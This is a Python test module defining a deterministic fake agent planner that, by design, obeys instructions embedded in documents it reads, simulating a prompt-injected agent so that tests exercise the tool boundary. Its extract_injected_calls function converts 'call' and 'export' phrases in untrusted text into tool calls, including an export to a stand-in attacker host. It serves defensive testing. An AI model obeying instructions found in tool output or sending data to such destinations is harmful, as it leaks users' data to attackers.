"""Deterministic fake agent planner (no LLM).

It is intentionally NAIVE: after reading a document it obeys any instruction it finds in the
document text ("call documents.read on doc-x", "export the result"). This simulates an agent that
has been successfully prompt-injected, so the tests exercise the *tool boundary* rather than
relying on the model to refuse. Security must hold even when the planner misbehaves.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Protocol

_CALL_RE = re.compile(r"(?i)\bcall\s+([a-z_]+\.[a-z_]+)(?:\s+on\s+([a-z0-9][a-z0-9-]*))?")
_EXPORT_RE = re.compile(r"(?i)\bexport\b")
_ID_RE = re.compile(r"\bdoc-[a-z0-9-]+\b")


@dataclass(frozen=True, slots=True)
class ToolResult:
    ok: bool
    data: dict[str, Any] | None = None
    error: str | None = None


class ToolClient(Protocol):
    async def call(self, name: str, arguments: dict[str, Any]) -> ToolResult: ...


@dataclass(slots=True)
class TraceEntry:
    step: int
    tool: str
    arguments: dict[str, Any]
    origin: str  # "plan" | "injected"
    ok: bool
    error: str | None = None

    def as_dict(self) -> dict[str, Any]:
        return {
            "step": self.step,
            "tool": self.tool,
            "arguments": self.arguments,
            "origin": self.origin,
            "ok": self.ok,
            "error": self.error,
        }


@dataclass(slots=True)
class AgentRun:
    trace: list[TraceEntry] = field(default_factory=list)
    report_id: str | None = None


def extract_injected_calls(text: str) -> list[tuple[str, dict[str, Any]]]:
    """Turn instructions embedded in untrusted text into tool calls (deliberately obedient)."""
    calls: list[tuple[str, dict[str, Any]]] = []
    targets: list[str] = []
    for m in _CALL_RE.finditer(text):
        tool, target = m.group(1).lower(), m.group(2)
        args: dict[str, Any] = {"resource_id": target} if target else {}
        if target:
            targets.append(target)
        calls.append((tool, args))
    if _EXPORT_RE.search(text):
        for target in targets or _ID_RE.findall(text)[:1]:
            calls.append(
                ("exports.simulate", {"resource_id": target, "destination": "https://attacker.invalid/drop"})
            )
    return calls


class DeterministicPlanner:
    def __init__(self, *, max_steps: int = 20) -> None:
        self._max_steps = max_steps

    async def run(self, *, task_id: str, resource_ids: list[str], client: ToolClient) -> AgentRun:
        run = AgentRun()
        read_ok: list[tuple[str, str]] = []

        async def invoke(tool: str, args: dict[str, Any], origin: str) -> ToolResult:
            if len(run.trace) >= self._max_steps:
                return ToolResult(ok=False, error="STEP_BUDGET_EXHAUSTED")
            result = await client.call(tool, args)
            run.trace.append(
                TraceEntry(
                    step=len(run.trace) + 1,
                    tool=tool,
                    arguments=_summarize(args),
                    origin=origin,
                    ok=result.ok,
                    error=result.error,
                )
            )
            return result

        for rid in resource_ids:
            res = await invoke("documents.read", {"resource_id": rid}, "plan")
            if not res.ok or res.data is None:
                continue
            read_ok.append((rid, str(res.data.get("title", ""))))
            # Untrusted tool OUTPUT is fed back into planning, as a real agent would.
            for tool, args in extract_injected_calls(str(res.data.get("body", ""))):
                injected = await invoke(tool, args, "injected")
                if injected.ok and tool == "documents.read" and injected.data is not None:
                    read_ok.append((str(args.get("resource_id")), str(injected.data.get("title", ""))))

        if read_ok:
            titles = "; ".join(t for _, t in read_ok)
            summary = f"Synthetic summary of {len(read_ok)} document(s): {titles}"[:1000]
            res = await invoke(
                "reports.create_summary",
                {"task_id": task_id, "document_ids": [rid for rid, _ in read_ok], "summary_text": summary},
                "plan",
            )
            if res.ok and res.data is not None:
                run.report_id = str(res.data.get("report_id"))
        return run


def _summarize(args: dict[str, Any]) -> dict[str, Any]:
    """Trace-safe arguments: free text is reduced to its length."""
    out: dict[str, Any] = {}
    for k, v in args.items():
        if k == "summary_text" and isinstance(v, str):
            out[k] = f"<{len(v)} chars>"
        else:
            out[k] = v
    return out
